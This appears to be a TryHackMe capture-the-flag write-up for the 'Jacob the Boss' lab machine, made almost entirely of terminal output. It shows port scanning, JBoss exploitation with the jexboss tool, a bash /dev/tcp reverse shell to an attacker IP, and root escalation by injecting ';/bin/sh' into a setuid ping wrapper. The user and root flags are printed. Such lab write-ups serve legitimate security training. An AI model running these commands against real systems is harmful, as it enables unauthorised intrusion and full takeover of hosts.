----
Find a way in and learn a little more.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/065e4dc344a4c5fc9155dd4ae9eca52b.jpeg)

### Task 1  Go on, it's your machine!

 Start Machine

Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.

*First of all, add the **jacobtheboss.box** address to your hosts file.  

Anyway, learn a little more, have fun!  

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ tac /etc/hosts
10.10.59.221 jacobtheboss.box

┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.59.221 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.59.221:22
Open 10.10.59.221:80
Open 10.10.59.221:111
Open 10.10.59.221:1090
Open 10.10.59.221:1098
Open 10.10.59.221:1099
Open 10.10.59.221:3306
Open 10.10.59.221:4444
Open 10.10.59.221:4445
Open 10.10.59.221:4446
Open 10.10.59.221:4712
Open 10.10.59.221:4713
Open 10.10.59.221:8083
Open 10.10.59.221:8080
Open 10.10.59.221:8009
Open 10.10.59.221:34187
Open 10.10.59.221:39279
Open 10.10.59.221:59898
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 11:40 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
Initiating Connect Scan at 11:40
Scanning jacobtheboss.box (10.10.59.221) [18 ports]
Discovered open port 80/tcp on 10.10.59.221
Discovered open port 111/tcp on 10.10.59.221
Discovered open port 8080/tcp on 10.10.59.221
Discovered open port 3306/tcp on 10.10.59.221
Discovered open port 22/tcp on 10.10.59.221
Discovered open port 1099/tcp on 10.10.59.221
Discovered open port 59898/tcp on 10.10.59.221
Discovered open port 8083/tcp on 10.10.59.221
Discovered open port 4712/tcp on 10.10.59.221
Discovered open port 4445/tcp on 10.10.59.221
Discovered open port 1098/tcp on 10.10.59.221
Discovered open port 4444/tcp on 10.10.59.221
Discovered open port 39279/tcp on 10.10.59.221
Discovered open port 4446/tcp on 10.10.59.221
Discovered open port 34187/tcp on 10.10.59.221
Discovered open port 1090/tcp on 10.10.59.221
Discovered open port 4713/tcp on 10.10.59.221
Discovered open port 8009/tcp on 10.10.59.221
Completed Connect Scan at 11:40, 0.48s elapsed (18 total ports)
Initiating Service scan at 11:40
Scanning 18 services on jacobtheboss.box (10.10.59.221)
Completed Service scan at 11:43, 164.00s elapsed (18 services on 1 host)
NSE: Script scanning 10.10.59.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:43
NSE Timing: About 99.88% done; ETC: 11:43 (0:00:00 remaining)
Completed NSE at 11:43, 30.70s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:43
Completed NSE at 11:43, 1.92s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:43
Completed NSE at 11:43, 0.00s elapsed
Nmap scan report for jacobtheboss.box (10.10.59.221)
Host is up, received user-set (0.21s latency).
Scanned at 2023-07-23 11:40:19 EDT for 198s

PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82ca136ed963c05f4a23a5a5a5103c7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOLOk6ktnJtucoDmXmBrc4H4gGe5Cybdy3jh1VZg+CYg+sZbYXzGi2/JO45cRqYd2NFIq7l+oTsjFgh76qAayKMU4D3+gKaC+U2VL93nCU1SywzvZLLc8MEy7mTHflOm4kZCmycgtJO4tfUhuH64yEP+lv3ENFeH5jgyJcGABF/p44MMSwnvpaLMfOuEGuEhKMPA4c+XAiS3J+sErUbpx6ragGGJAKTpww+arDy11slMsyJgjN6GUjlR0y+P0E4/NsrNHe86GKXJ1G4bfKEdKOPeTZ+wZMNFDCVNLPHLWUBIgWNQHIgRcXiBvPAvIrrt8gV/+td9C74Bsj0VqEEJnP
|   256 a46ed25d0d362e732f1d529ce58a7b04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNUtPCeXKNaq6WZlT3PxbZbQmka1bb5I+yBRhUb5tzmf2GEmdDOk6R7MSUlEtzGzQ4GjAWFZG3q7ZcBahg8ur8A=
|   256 6f54a65eba5badcc87eed3a8d5e0aa2a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJI3bQUWzwhk0iJYl+gGn09NgvRLtN4vJ4DG6SrE7/Hb
80/tcp    open  http        syn-ack Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-title: My first blog
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp  open  java-rmi    syn-ack Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp  open  java-rmi    syn-ack Java RMI
1099/tcp  open  java-object syn-ack Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp  open  mysql       syn-ack MariaDB (unauthorized)
4444/tcp  open  java-rmi    syn-ack Java RMI
4445/tcp  open  java-object syn-ack Java Object Serialization
4446/tcp  open  java-object syn-ack Java Object Serialization
4712/tcp  open  msdtc       syn-ack Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    858b
8009/tcp  open  ajp13       syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http        syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Unknown favicon MD5: 799F70B71314A7508326D1D2F68F7519
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_http-title: Welcome to JBoss&trade;
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
8083/tcp  open  http        syn-ack JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
34187/tcp open  unknown     syn-ack
39279/tcp open  java-rmi    syn-ack Java RMI
59898/tcp open  unknown     syn-ack
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.93%I=7%D=7/23%Time=64BD49E4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
SF:esq\0~\0\x01xp\x01\"U\xeaur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0
SF:\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0\0
SF:q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.Na
SF:mingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.Rem
SF:oteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server\.
SF:RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\x1
SF:0jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0m\xfb\x10\xeb\0\0\x01\x89\x8
SF:3fK\xf6\x80\0\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4445-TCP:V=7.93%I=7%D=7/23%Time=64BD49EA%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.93%I=7%D=7/23%Time=64BD49EA%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.93%I=7%D=7/23%Time=64BD49EA%P=x86_64-pc-linux-gnu%r(NU
SF:LL,5,"858b\n")%r(GenericLines,5,"858b\n")%r(GetRequest,5,"858b\n")%r(HT
SF:TPOptions,5,"858b\n")%r(RTSPRequest,5,"858b\n")%r(RPCCheck,5,"858b\n")%
SF:r(DNSVersionBindReqTCP,5,"858b\n")%r(DNSStatusRequestTCP,5,"858b\n")%r(
SF:Help,5,"858b\n")%r(SSLSessionReq,5,"858b\n")%r(TerminalServerCookie,5,"
SF:858b\n")%r(TLSSessionReq,5,"858b\n")%r(Kerberos,5,"858b\n")%r(SMBProgNe
SF:g,5,"858b\n")%r(X11Probe,5,"858b\n")%r(FourOhFourRequest,5,"858b\n")%r(
SF:LPDString,5,"858b\n")%r(LDAPSearchReq,5,"858b\n")%r(LDAPBindReq,5,"858b
SF:\n")%r(SIPOptions,5,"858b\n")%r(LANDesk-RC,5,"858b\n")%r(TerminalServer
SF:,5,"858b\n")%r(NCP,5,"858b\n")%r(NotesRPC,5,"858b\n")%r(JavaRMI,5,"858b
SF:\n")%r(WMSRequest,5,"858b\n")%r(oracle-tns,5,"858b\n")%r(ms-sql-s,5,"85
SF:8b\n")%r(afp,5,"858b\n")%r(giop,5,"858b\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:43
Completed NSE at 11:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:43
Completed NSE at 11:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:43
Completed NSE at 11:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.16 seconds

http://jacobtheboss.box:8080/ Jboss

http://jacobtheboss.box:8080/jbossws/


    Version: jbossws-native-3.0.4.SP1
    Build: 200811271317
    View a list of deployed services
    Access JMX console

like tony tiger

git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python jexboss.py -h

┌──(witty㉿kali)-[~/Downloads/jexboss]
└─$ python jexboss.py -host http://jacobtheboss.box:8080

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://jacobtheboss.box:8080 **

 [*] Checking jmx-console:                 
  [ VULNERABLE ]
 [*] Checking web-console:                 
  [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:           
  [ VULNERABLE ]
 [*] Checking admin-console:               
  [ OK ]
 [*] Checking Application Deserialization: 
  [ OK ]
 [*] Checking Servlet Deserialization:     
  [ OK ]
 [*] Checking Jenkins:                     
  [ OK ]
 [*] Checking Struts2:                     
  [ OK ]


 * Do you want to try to run an automated exploitation via "jmx-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? no


 * Do you want to try to run an automated exploitation via "web-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? no


 * Do you want to try to run an automated exploitation via "JMXInvokerServlet" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://jacobtheboss.box:8080. Please wait...

 * Successfully deployed code! Starting command shell. Please wait...

# ----------------------------------------- # LOL # ----------------------------------------- #

 * http://jacobtheboss.box:8080: 

# ----------------------------------------- #

 * For a Reverse Shell (like meterpreter =]), type the command: 

   jexremote=YOUR_IP:YOUR_PORT

   Example:
     Shell>jexremote=192.168.0.10:4444

   Or use other techniques of your choice, like:
     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1
   
   And so on... =]

# ----------------------------------------- #

  Failed to check for updates
Linux jacobtheboss.box 3.10.0-1127.18.2.el7.x86_64 #1 SMP Sun Jul 26 15:27:06 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
'  Failed to check for updates
\\S
Kernel \\r on an \\m

'  Failed to check for updates
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
'
[Type commands or "exit" to finish]
Shell> id
 Failed to check for updates
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
'
[Type commands or "exit" to finish]
Shell> /bin/bash -i > /dev/tcp/10.8.19.103/4444 0>&1 2>&1

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.59.221] 33766
bash: no job control in this shell
[jacob@jacobtheboss /]$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
<wn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null                 
bash: python3: command not found
[jacob@jacobtheboss /]$ ls
ls
bin   dev  home  lib64	mnt  proc  run	 srv	   sys	usr
boot  etc  lib	 media	opt  root  sbin  swapfile  tmp	var
[jacob@jacobtheboss /]$ cd /home
cd /home
[jacob@jacobtheboss home]$ ls
ls
jacob
[jacob@jacobtheboss home]$ cd jacob
cd jacob
[jacob@jacobtheboss ~]$ ls
ls
user.txt
[jacob@jacobtheboss ~]$ cat user.txt
cat user.txt
f4d491f280de360cc49e26ca1587cbcc

[jacob@jacobtheboss ~]$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
[jacob@jacobtheboss ~]$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
<d / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;                      
-rwsr-xr-x. 1 root root 8536 Jul 30  2020 /usr/bin/pingsys
-rwsr-xr-x. 1 root root 32096 Oct 30  2018 /usr/bin/fusermount
-rwsr-xr-x. 1 root root 78408 Aug  9  2019 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 32128 Apr  1  2020 /usr/bin/su
-rws--x--x. 1 root root 23968 Apr  1  2020 /usr/bin/chfn
-rwsr-xr-x. 1 root root 41936 Aug  9  2019 /usr/bin/newgrp
-rws--x--x. 1 root root 23880 Apr  1  2020 /usr/bin/chsh
---s--x--x. 1 root root 147336 Apr  1  2020 /usr/bin/sudo
-rwsr-xr-x. 1 root root 44264 Apr  1  2020 /usr/bin/mount
-rwsr-xr-x. 1 root root 73888 Aug  9  2019 /usr/bin/chage
-rwsr-xr-x. 1 root root 31984 Apr  1  2020 /usr/bin/umount
-rwsr-xr-x. 1 root root 57656 Aug  8  2019 /usr/bin/crontab
-rwsr-xr-x. 1 root root 23576 Apr  1  2020 /usr/bin/pkexec
-rwsr-xr-x. 1 root root 27856 Apr  1  2020 /usr/bin/passwd
-rwsr-xr-x. 1 root root 11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 36272 Apr  1  2020 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 11296 Apr  1  2020 /usr/sbin/usernetctl
-rwsr-xr-x. 1 root root 117432 Apr  1  2020 /usr/sbin/mount.nfs
-rwsr-xr-x. 1 root root 15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-x---. 1 root dbus 57936 Jul 13  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
[jacob@jacobtheboss ~]$ file /usr/bin/pingsys
file /usr/bin/pingsys
/usr/bin/pingsys: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=6edc93ec3e4b82857772727e602265140ee00823, not stripped
[jacob@jacobtheboss ~]$ ltrace /usr/bin/pingsys
ltrace /usr/bin/pingsys
bash: ltrace: command not found
[jacob@jacobtheboss ~]$ strings /usr/bin/pingsys
strings /usr/bin/pingsys
/lib64/ld-linux-x86-64.so.2
wrr~`"e
libc.so.6
setuid
system
__libc_start_main
snprintf
__gmon_start__
GLIBC_2.2.5
UH-P
UH-P
[]A\A]A^A_
ping -c 4 %s
setUID ERROR

[jacob@jacobtheboss ~]$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:2c:1b:a1:89:7f brd ff:ff:ff:ff:ff:ff
    inet 10.10.59.221/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3512sec preferred_lft 3512sec
    inet6 fe80::2c:1bff:fea1:897f/64 scope link 
       valid_lft forever preferred_lft forever

sh-4.2$ /usr/bin/pingsys 127.0.0.1;/bin/sh
/usr/bin/pingsys 127.0.0.1;/bin/sh
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.030 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.030 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.019/0.027/0.032/0.008 ms
sh-4.2$ id
id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
sh-4.2$ cd /root
cd /root
sh: cd: /root: Permission denied
sh-4.2$ /usr/bin/pingsys '127.0.0.1;/bin/sh'
/usr/bin/pingsys '127.0.0.1;/bin/sh'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.030 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.018/0.028/0.035/0.009 ms
sh-4.2# id
id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
sh-4.2# cd /root
cd /root
sh-4.2# ls
ls
anaconda-ks.cfg  jboss.sh  original-ks.cfg  root.txt
sh-4.2# cat root.txt
cat root.txt
29a5641eaa0c01abe5749608c8232806
sh-4.2# cat jboss.sh
cat jboss.sh
#!/bin/bash

sudo -u jacob sh /srv/jboss/bin/run.sh -b jacobtheboss.box


```

user.txt

*f4d491f280de360cc49e26ca1587cbcc*

root.txt

*29a5641eaa0c01abe5749608c8232806*

[[Aratus]]